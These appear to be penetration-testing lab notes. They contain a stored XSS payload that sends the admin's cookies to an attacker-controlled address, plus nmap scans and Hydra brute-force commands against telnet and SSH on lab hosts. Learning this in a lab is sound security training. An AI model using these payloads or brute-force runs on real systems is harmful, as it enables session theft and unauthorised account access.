XSS:
<h1> Test XSS </h1>

Let us now check if javascript code can be injected too. To do this let us use the following
payload: <script> alert('XSS') </script>

Note that we have created this page for your
convenience and that in a real situation youâ€™d need to have this page on your server.

<script>
var i = new Image();
i.src="http://192.168.99.11/get.php?cookies="+document.cookie;
</script>

After we insert the previous payload, we just have to wait few minutes until the admin
opens the contacts page. The script will run and steal the cookies.

Once the script runs on the admin machine, we should be able to see the stolen cookies in
the jar.txt file hosted on http://192.168.99.11/jar.txt (You can open this url from your web
browser).

BRUTEFORCE PASSWORD CRACKING: 
ifconfig
nmap -sn IP RANGE

Let us target the host found in the previous step and check what ports 
are open and services it hasrunning
nmap -sV IP (port scan)

It is time to get our hands dirty! Let us try to bruteforce both telnet and SSH in order to find any working pair of username and password. To do this we are going to use 
Hydra. For the telnet service, let us use the following command and see what we get: 

hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-10.txt telnet://192.168.99.22

telnet IP -l sysadmin


hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-15.txt 192.168.99.22 ssh

Once we have the hashes we can just store it locally into a file and use John the Ripper 
to  crack them
